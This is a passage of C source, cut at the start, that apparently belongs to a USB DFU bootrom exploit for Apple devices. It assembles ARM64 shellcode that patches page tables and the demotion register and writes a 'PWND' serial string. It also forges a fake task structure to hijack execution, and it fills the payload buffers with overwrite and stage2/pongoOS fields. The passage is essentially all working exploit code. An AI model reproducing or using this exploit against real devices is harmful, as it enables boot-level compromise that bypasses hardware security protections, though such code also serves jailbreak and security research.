        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0xf900000a; i+=4; // nop (a8) / str   x10, [x0]
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0xd5033f9f; i+=4; // nop (a8) / dsb   sy
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0xd50e871f; i+=4; // nop (a8) / tlbi  alle3
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0xd5033f9f; i+=4; // nop (a8) / dsb   sy
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0xd5033fdf; i+=4; // nop (a8) / isb
        
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0xd50343ff; i+=4; // nop (a8) / msr   daifclr, #0x3
        *(uint32_t*)(shc+i) = isA8 ? INSN_NOP : 0xd5033fdf; i+=4; // nop (a8) / isb
        
        // _end:
        *(uint32_t*)(shc+i) = 0xd508751f; i+=4; // sys  #0, c7, c5, #0
        *(uint32_t*)(shc+i) = 0xd5033f9f; i+=4; // dsb  sy
        *(uint32_t*)(shc+i) = 0xd5033fdf; i+=4; // isb
        
        *(uint32_t*)(shc+i) = 0xa8c17bfd; i+=4; // ldp  x29, x30, [sp], #0x10
        *(uint32_t*)(shc+i) = 0xd65f03c0; i+=4; // ret
        
        // PWND_STRING:
        *(uint32_t*)(shc+i) = PWND_STR0;  i+=4;
        *(uint32_t*)(shc+i) = PWND_STR1;  i+=4;
        *(uint32_t*)(shc+i) = PWND_STR2;  i+=4;
        *(uint32_t*)(shc+i) = PWND_STR3;  i+=4;
        *(uint32_t*)(shc+i) = INSN_NOP;   i+=4; // nop
        
        // OFFSETS:
        *(uint64_t*)(shc+i) = gUSBSerialNumber; i+=8;
        *(uint64_t*)(shc+i) = usb_create_string_descriptor; i+=8;
        *(uint64_t*)(shc+i) = gUSBSRNMStringDescriptor; i+=8;
        *(uint64_t*)(shc+i) = client->isDemotion; i+=8;
        *(uint64_t*)(shc+i) = gDemotionRegister; i+=8;
        *(uint64_t*)(shc+i) = TTBR0_BASE + VROM_PAGE_OFFSET; i+=8;
        *(uint64_t*)(shc+i) = PATCH_ADDR; i+=8;
        
        overwrite.fake_task.magic_0 = TASK_STACK_MAGIC;
        overwrite.fake_task.arch.lr = ARCH_TASK_TRAMP_ADDR;
        overwrite.fake_task.stack_len = overwrite.synopsys_task.stack_len;
        overwrite.fake_task.stack_base = overwrite.synopsys_task.stack_base;
        overwrite.fake_task.arch.sp = overwrite.fake_task.stack_base + overwrite.fake_task.stack_len;
        overwrite.fake_task.routine = overwrite.fake_task.stack_base + offsetof(dfu_task_t, arch.shc);
        overwrite.fake_task.queue_list.prev = overwrite.fake_task.queue_list.next = IO_BUFFER_ADDR + offsetof(dfu_task_t, ret_waiters_list);
        overwrite.fake_task.ret_waiters_list.prev = overwrite.fake_task.ret_waiters_list.next = overwrite.fake_task.stack_base + offsetof(dfu_task_t, ret_waiters_list);
        
        size_t payloadLen = sizeof(overwrite) - offsetof(dfu_overwrite_t, synopsys_task.callout);
        memcpy(buf+0x40, (const void*)&overwrite + offsetof(dfu_overwrite_t, synopsys_task.callout), payloadLen);
        
        payload->over1 = NULL;
        payload->over1_len = 0;
    }
    
    payload->over2 = buf;
    payload->over2_len = 2048;
    
    payload->stage2 = NULL;
    payload->pongoOS = NULL;
    payload->stage2_len = 0;
    payload->pongoOS_len = 0;
    
    return 0;
}
